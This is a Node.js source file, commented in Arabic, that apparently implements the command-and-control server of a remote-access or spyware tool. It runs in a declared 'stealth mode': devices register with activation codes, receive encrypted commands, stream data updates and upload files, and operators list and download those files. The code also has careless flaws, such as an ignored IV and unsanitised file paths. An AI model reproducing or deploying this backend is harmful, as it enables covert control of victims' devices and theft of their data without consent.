const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const multer = require('multer');
const archiver = require('archiver');

// إعدادات الأمان والتخفي
const SECURITY_CONFIG = {
    enableRateLimit: true,
    enableCORS: true,
    enableCompression: true,
    maxFileSize: '50mb',
    sessionTimeout: 3600000,
    encryptionEnabled: true,
    stealthMode: true
};

const app = express();
const server = http.createServer(app);

// إعدادات التطبيق
app.use(express.json({ limit: SECURITY_CONFIG.maxFileSize }));
app.use(express.urlencoded({ extended: true, limit: SECURITY_CONFIG.maxFileSize }));

// إعدادات CORS للتخفي
if (SECURITY_CONFIG.enableCORS) {
    app.use(cors({
        origin: ['http://localhost:3000', 'https://your-domain.com'],
        credentials: true,
        methods: ['GET', 'POST', 'PUT', 'DELETE'],
        allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
    }));
}

// حماية من هجمات DDoS
if (SECURITY_CONFIG.enableRateLimit) {
    const limiter = rateLimit({
        windowMs: 15 * 60 * 1000,
        max: 200,
        message: {
            error: 'تم تجاوز الحد الأقصى للطلبات. يرجى المحاولة لاحقاً.'
        },
        standardHeaders: true,
        legacyHeaders: false
    });
    app.use(limiter);
}

// إعداد WebSocket مع التخفي
const wss = new WebSocket.Server({ 
    server,
    perMessageDeflate: false, // تعطيل ضغط الرسائل للتخفي
    clientTracking: true
});

// تخزين الأجهزة المتصلة مع تشفير
const connectedDevices = new Map();
const deviceEncryptionKey = crypto.randomBytes(32);
const commandHistory = new Map();

// تشفير البيانات
function encryptData(data) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipher('aes-256-cbc', deviceEncryptionKey);
    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return iv.toString('hex') + ':' + encrypted;
}

// فك تشفير البيانات
function decryptData(encryptedData) {
    try {
        const [ivHex, encrypted] = encryptedData.split(':');
        const iv = Buffer.from(ivHex, 'hex');
        const decipher = crypto.createDecipher('aes-256-cbc', deviceEncryptionKey);
        let decrypted = decipher.update(encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return JSON.parse(decrypted);
    } catch (error) {
        return null;
    }
}

// إعداد WebSocket
wss.on('connection', (ws, req) => {
    console.log('🔗 اتصال جديد من:', req.socket.remoteAddress);
    
    // إخفاء معلومات الخادم
    ws._socket.setKeepAlive(true, 60000);
    ws._socket.setNoDelay(true);
    
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            
            if (data.type === 'register') {
                handleDeviceRegistration(ws, data);
            } else if (data.type === 'command_result') {
                handleCommandResult(ws, data);
            } else if (data.type === 'data_update') {
                handleDataUpdate(ws, data);
            } else if (data.type === 'heartbeat') {
                handleHeartbeat(ws, data);
            } else if (data.type === 'activation_confirmation') {
                handleActivationConfirmation(ws, data);
            } else if (data.type === 'file_upload') {
                handleFileUpload(ws, data);
            }
        } catch (e) {
            console.error('خطأ في معالجة الرسالة:', e);
        }
    });
    
    ws.on('close', () => {
        handleDeviceDisconnection(ws);
    });
    
    ws.on('error', (error) => {
        console.error('خطأ في WebSocket:', error);
        handleDeviceDisconnection(ws);
    });
});

// معالجة تسجيل الجهاز
function handleDeviceRegistration(ws, data) {
    const { deviceId, activationCode, capabilities, timestamp } = data;
    
    // التحقق من صحة البيانات
    if (!deviceId || !activationCode) {
        ws.send(JSON.stringify({
            type: 'error',
            message: 'بيانات تسجيل غير صحيحة'
        }));
        return;
    }
    
    // تسجيل الجهاز
    const deviceInfo = {
        deviceId,
        activationCode,
        capabilities,
        ws,
        status: 'connected',
        registeredAt: timestamp || Date.now(),
        lastSeen: Date.now(),
        ipAddress: ws._socket.remoteAddress,
        userAgent: ws._socket.remoteAddress // إخفاء User-Agent الحقيقي
    };
    
    connectedDevices.set(deviceId, deviceInfo);
    
    // حفظ في قاعدة البيانات
    saveDeviceToDatabase(deviceInfo);
    
    // إرسال تأكيد التسجيل
    ws.send(JSON.stringify({
        type: 'registration_confirmed',
        deviceId,
        message: 'تم التسجيل بنجاح',
        timestamp: Date.now()
    }));
    
    console.log(`✅ تم تسجيل الجهاز: ${deviceId}`);
    
    // إرسال إشعار للواجهة الإدارية
    broadcastToAdmins({
        type: 'device_connected',
        deviceId,
        timestamp: Date.now()
    });
}

// معالجة نتائج الأوامر
function handleCommandResult(ws, data) {
    const { command, status, data: resultData, timestamp } = data;
    
    // حفظ في سجل الأوامر
    const commandRecord = {
        command,
        status,
        data: resultData,
        timestamp,
        deviceId: getDeviceIdByWebSocket(ws)
    };
    
    saveCommandToHistory(commandRecord);
    
    // إرسال النتيجة للمشرفين
    broadcastToAdmins({
        type: 'command_result',
        ...commandRecord
    });
    
    console.log(`📋 نتيجة أمر: ${command} - ${status}`);
}

// معالجة تحديثات البيانات
function handleDataUpdate(ws, data) {
    const { dataType, data: updateData, timestamp } = data;
    const deviceId = getDeviceIdByWebSocket(ws);
    
    // حفظ البيانات
    saveDataUpdate(deviceId, dataType, updateData, timestamp);
    
    // إرسال للمشرفين
    broadcastToAdmins({
        type: 'data_update',
        deviceId,
        dataType,
        data: updateData,
        timestamp
    });
    
    console.log(`📊 تحديث بيانات: ${dataType} من ${deviceId}`);
}

// معالجة نبض الحياة
function handleHeartbeat(ws, data) {
    const { deviceId, timestamp } = data;
    const device = connectedDevices.get(deviceId);
    
    if (device) {
        device.lastSeen = timestamp || Date.now();
        device.status = 'connected';
        connectedDevices.set(deviceId, device);
        
        // تحديث في قاعدة البيانات
        updateDeviceStatus(deviceId, 'connected', device.lastSeen);
    }
}

// معالجة تأكيد التفعيل
function handleActivationConfirmation(ws, data) {
    const { deviceId, status, timestamp } = data;
    
    // تحديث حالة الجهاز
    updateDeviceStatus(deviceId, 'activated', timestamp);
    
    // إرسال إشعار للمشرفين
    broadcastToAdmins({
        type: 'device_activated',
        deviceId,
        timestamp
    });
    
    console.log(`🎉 تم تفعيل الجهاز: ${deviceId}`);
}

// معالجة رفع الملفات
function handleFileUpload(ws, data) {
    const { deviceId, filename, fileData, fileType, timestamp } = data;
    
    try {
        // فك تشفير بيانات الملف
        const decryptedData = decryptData(fileData);
        if (!decryptedData) {
            throw new Error('فشل في فك تشفير الملف');
        }
        
        // حفظ الملف
        const uploadDir = path.join(__dirname, 'uploads', deviceId);
        if (!fs.existsSync(uploadDir)) {
            fs.mkdirSync(uploadDir, { recursive: true });
        }
        
        const filePath = path.join(uploadDir, filename);
        const fileBuffer = Buffer.from(decryptedData, 'base64');
        
        fs.writeFileSync(filePath, fileBuffer);
        
        // تسجيل في قاعدة البيانات
        saveFileRecord(deviceId, filename, filePath, fileType, timestamp);
        
        // إرسال تأكيد
        ws.send(JSON.stringify({
            type: 'file_upload_confirmed',
            filename,
            status: 'success',
            timestamp: Date.now()
        }));
        
        console.log(`📁 تم رفع الملف: ${filename} من ${deviceId}`);
        
    } catch (error) {
        console.error('خطأ في رفع الملف:', error);
        ws.send(JSON.stringify({
            type: 'file_upload_error',
            filename,
            error: error.message,
            timestamp: Date.now()
        }));
    }
}

// معالجة انقطاع اتصال الجهاز
function handleDeviceDisconnection(ws) {
    const deviceId = getDeviceIdByWebSocket(ws);
    
    if (deviceId) {
        const device = connectedDevices.get(deviceId);
        if (device) {
            device.status = 'disconnected';
            device.lastSeen = Date.now();
            connectedDevices.set(deviceId, device);
            
            // تحديث في قاعدة البيانات
            updateDeviceStatus(deviceId, 'disconnected', device.lastSeen);
            
            console.log(`❌ انقطع اتصال الجهاز: ${deviceId}`);
            
            // إرسال إشعار للمشرفين
            broadcastToAdmins({
                type: 'device_disconnected',
                deviceId,
                timestamp: Date.now()
            });
        }
    }
}

// واجهة إرسال الأوامر
app.post('/send-command', express.json(), (req, res) => {
    const { deviceId, command, parameters } = req.body;
    
    if (!connectedDevices.has(deviceId)) {
        return res.status(404).json({ 
            error: 'الجهاز غير متصل',
            deviceId,
            timestamp: Date.now()
        });
    }
    
    try {
        const device = connectedDevices.get(deviceId);
        const commandId = generateCommandId();
        
        // إنشاء الأمر المشفر
        const encryptedCommand = encryptData({
            action: command,
            parameters: parameters || {},
            commandId,
            timestamp: Date.now()
        });
        
        // إرسال الأمر للجهاز
        device.ws.send(JSON.stringify({
            type: 'command',
            data: encryptedCommand,
            commandId
        }));
        
        // حفظ في سجل الأوامر
        saveCommandToHistory({
            commandId,
            deviceId,
            command,
            parameters,
            status: 'sent',
            timestamp: Date.now()
        });
        
        res.json({
            success: true,
            message: 'تم إرسال الأمر بنجاح',
            commandId,
            timestamp: Date.now()
        });
        
        console.log(`📤 تم إرسال الأمر: ${command} إلى ${deviceId}`);
        
    } catch (e) {
        console.error('خطأ في إرسال الأمر:', e);
        res.status(500).json({ 
            error: 'فشل في إرسال الأمر',
            timestamp: Date.now()
        });
    }
});

// واجهة رفع الملفات
const upload = multer({
    storage: multer.diskStorage({
        destination: (req, file, cb) => {
            const deviceId = req.body.deviceId || 'unknown';
            const uploadDir = path.join(__dirname, 'uploads', deviceId);
            if (!fs.existsSync(uploadDir)) {
                fs.mkdirSync(uploadDir, { recursive: true });
            }
            cb(null, uploadDir);
        },
        filename: (req, file, cb) => {
            const timestamp = Date.now();
            const filename = `${timestamp}_${file.originalname}`;
            cb(null, filename);
        }
    }),
    limits: {
        fileSize: 50 * 1024 * 1024 // 50MB
    }
});

app.post('/upload', upload.single('file'), (req, res) => {
    try {
        const { deviceId } = req.body;
        const file = req.file;
        
        if (!file) {
            return res.status(400).json({ error: 'لم يتم تحديد ملف' });
        }
        
        // تسجيل الملف
        saveFileRecord(
            deviceId,
            file.originalname,
            file.path,
            file.mimetype,
            Date.now()
        );
        
        res.json({
            success: true,
            message: 'تم رفع الملف بنجاح',
            filename: file.originalname,
            filepath: file.path,
            timestamp: Date.now()
        });
        
    } catch (error) {
        console.error('خطأ في رفع الملف:', error);
        res.status(500).json({ error: 'فشل في رفع الملف' });
    }
});

// واجهة قائمة الأجهزة المتصلة
app.get('/devices', (req, res) => {
    try {
        const devices = Array.from(connectedDevices.values()).map(device => ({
            deviceId: device.deviceId,
            status: device.status,
            lastSeen: device.lastSeen,
            registeredAt: device.registeredAt,
            capabilities: device.capabilities
        }));
        
        res.json({
            success: true,
            devices,
            totalCount: devices.length,
            timestamp: Date.now()
        });
        
    } catch (error) {
        console.error('خطأ في جلب قائمة الأجهزة:', error);
        res.status(500).json({ error: 'خطأ في جلب قائمة الأجهزة' });
    }
});

// واجهة حالة الجهاز
app.get('/device-status/:deviceId', (req, res) => {
    try {
        const { deviceId } = req.params;
        const device = connectedDevices.get(deviceId);
        
        if (!device) {
            return res.status(404).json({ error: 'الجهاز غير موجود' });
        }
        
        res.json({
            success: true,
            device: {
                deviceId: device.deviceId,
                status: device.status,
                lastSeen: device.lastSeen,
                registeredAt: device.registeredAt,
                capabilities: device.capabilities
            },
            timestamp: Date.now()
        });
        
    } catch (error) {
        console.error('خطأ في جلب حالة الجهاز:', error);
        res.status(500).json({ error: 'خطأ في جلب حالة الجهاز' });
    }
});

// واجهة سجل الأوامر
app.get('/command-history/:deviceId', (req, res) => {
    try {
        const { deviceId } = req.params;
        const history = commandHistory.get(deviceId) || [];
        
        res.json({
            success: true,
            history,
            totalCount: history.length,
            timestamp: Date.now()
        });
        
    } catch (error) {
        console.error('خطأ في جلب سجل الأوامر:', error);
        res.status(500).json({ error: 'خطأ في جلب سجل الأوامر' });
    }
});

// واجهة تحميل الملفات
app.get('/download/:deviceId/:filename', (req, res) => {
    try {
        const { deviceId, filename } = req.params;
        const filePath = path.join(__dirname, 'uploads', deviceId, filename);
        
        if (!fs.existsSync(filePath)) {
            return res.status(404).json({ error: 'الملف غير موجود' });
        }
        
        res.download(filePath, filename);
        
    } catch (error) {
        console.error('خطأ في تحميل الملف:', error);
        res.status(500).json({ error: 'خطأ في تحميل الملف' });
    }
});

// واجهة حذف الجهاز
app.delete('/device/:deviceId', (req, res) => {
    try {
        const { deviceId } = req.params;
        
        if (connectedDevices.has(deviceId)) {
            const device = connectedDevices.get(deviceId);
            device.ws.close();
            connectedDevices.delete(deviceId);
            
            // حذف من قاعدة البيانات
            deleteDeviceFromDatabase(deviceId);
            
            res.json({
                success: true,
                message: 'تم حذف الجهاز بنجاح',
                timestamp: Date.now()
            });
        } else {
            res.status(404).json({ error: 'الجهاز غير موجود' });
        }
        
    } catch (error) {
        console.error('خطأ في حذف الجهاز:', error);
        res.status(500).json({ error: 'خطأ في حذف الجهاز' });
    }
});

// واجهة إحصائيات النظام
app.get('/stats', (req, res) => {
    try {
        const stats = {
            totalDevices: connectedDevices.size,
            activeDevices: Array.from(connectedDevices.values()).filter(d => d.status === 'connected').length,
            totalCommands: Array.from(commandHistory.values()).flat().length,
            systemUptime: process.uptime(),
            memoryUsage: process.memoryUsage(),
            timestamp: Date.now()
        };
        
        res.json({
            success: true,
            stats
        });
        
    } catch (error) {
        console.error('خطأ في جلب الإحصائيات:', error);
        res.status(500).json({ error: 'خطأ في جلب الإحصائيات' });
    }
});

// وظائف مساعدة
function getDeviceIdByWebSocket(ws) {
    for (const [deviceId, device] of connectedDevices.entries()) {
        if (device.ws === ws) {
            return deviceId;
        }
    }
    return null;
}

function generateCommandId() {
    return 'CMD-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
}

function broadcastToAdmins(data) {
    // إرسال للمشرفين المتصلين
    wss.clients.forEach(client => {
        if (client.isAdmin) {
            client.send(JSON.stringify(data));
        }
    });
}

function saveDeviceToDatabase(deviceInfo) {
    try {
        const devicesFile = path.join(__dirname, 'data', 'devices.json');
        let devices = [];
        
        if (fs.existsSync(devicesFile)) {
            devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
        }
        
        const existingIndex = devices.findIndex(d => d.deviceId === deviceInfo.deviceId);
        if (existingIndex >= 0) {
            devices[existingIndex] = deviceInfo;
        } else {
            devices.push(deviceInfo);
        }
        
        fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
    } catch (error) {
        console.error('خطأ في حفظ الجهاز:', error);
    }
}

function updateDeviceStatus(deviceId, status, timestamp) {
    try {
        const devicesFile = path.join(__dirname, 'data', 'devices.json');
        if (fs.existsSync(devicesFile)) {
            let devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
            const device = devices.find(d => d.deviceId === deviceId);
            if (device) {
                device.status = status;
                device.lastSeen = timestamp;
                fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
            }
        }
    } catch (error) {
        console.error('خطأ في تحديث حالة الجهاز:', error);
    }
}

function saveCommandToHistory(commandRecord) {
    try {
        const { deviceId } = commandRecord;
        if (!commandHistory.has(deviceId)) {
            commandHistory.set(deviceId, []);
        }
        
        const history = commandHistory.get(deviceId);
        history.push(commandRecord);
        
        // الاحتفاظ بآخر 100 أمر فقط
        if (history.length > 100) {
            history.shift();
        }
        
        commandHistory.set(deviceId, history);
    } catch (error) {
        console.error('خطأ في حفظ سجل الأمر:', error);
    }
}

function saveDataUpdate(deviceId, dataType, data, timestamp) {
    try {
        const dataFile = path.join(__dirname, 'data', `${deviceId}_${dataType}.json`);
        const dataRecord = {
            deviceId,
            dataType,
            data,
            timestamp
        };
        
        let dataHistory = [];
        if (fs.existsSync(dataFile)) {
            dataHistory = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
        }
        
        dataHistory.push(dataRecord);
        
        // الاحتفاظ بآخر 1000 سجل فقط
        if (dataHistory.length > 1000) {
            dataHistory = dataHistory.slice(-1000);
        }
        
        fs.writeFileSync(dataFile, JSON.stringify(dataHistory, null, 2));
    } catch (error) {
        console.error('خطأ في حفظ تحديث البيانات:', error);
    }
}

function saveFileRecord(deviceId, filename, filepath, fileType, timestamp) {
    try {
        const filesFile = path.join(__dirname, 'data', 'files.json');
        let files = [];
        
        if (fs.existsSync(filesFile)) {
            files = JSON.parse(fs.readFileSync(filesFile, 'utf8'));
        }
        
        const fileRecord = {
            deviceId,
            filename,
            filepath,
            fileType,
            uploadDate: timestamp,
            fileSize: fs.statSync(filepath).size
        };
        
        files.push(fileRecord);
        fs.writeFileSync(filesFile, JSON.stringify(files, null, 2));
    } catch (error) {
        console.error('خطأ في حفظ سجل الملف:', error);
    }
}

function deleteDeviceFromDatabase(deviceId) {
    try {
        const devicesFile = path.join(__dirname, 'data', 'devices.json');
        if (fs.existsSync(devicesFile)) {
            let devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
            devices = devices.filter(d => d.deviceId !== deviceId);
            fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
        }
    } catch (error) {
        console.error('خطأ في حذف الجهاز من قاعدة البيانات:', error);
    }
}

// إنشاء المجلدات المطلوبة
function createRequiredDirectories() {
    const directories = [
        path.join(__dirname, 'data'),
        path.join(__dirname, 'uploads'),
        path.join(__dirname, 'logs')
    ];
    
    directories.forEach(dir => {
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
    });
}

// تنظيف دوري للأجهزة غير النشطة
function cleanupInactiveDevices() {
    const now = Date.now();
    const inactiveThreshold = 30 * 60 * 1000; // 30 دقيقة
    
    for (const [deviceId, device] of connectedDevices.entries()) {
        if (now - device.lastSeen > inactiveThreshold) {
            device.ws.close();
            connectedDevices.delete(deviceId);
            console.log(`🧹 تم تنظيف الجهاز غير النشط: ${deviceId}`);
        }
    }
}

// تهيئة النظام
createRequiredDirectories();

// تنظيف دوري
setInterval(cleanupInactiveDevices, 10 * 60 * 1000); // كل 10 دقائق

// تشغيل الخادم
const PORT = process.env.PORT || 4000;
server.listen(PORT, () => {
    console.log(`🚀 خادم التحكم يعمل على http://localhost:${PORT}`);
    console.log('✅ تم تهيئة النظام بنجاح');
    console.log('🔒 وضع الأمان مفعل');
    console.log('👻 وضع التخفي مفعل');
    console.log(`📊 الأجهزة المتصلة: ${connectedDevices.size}`);
});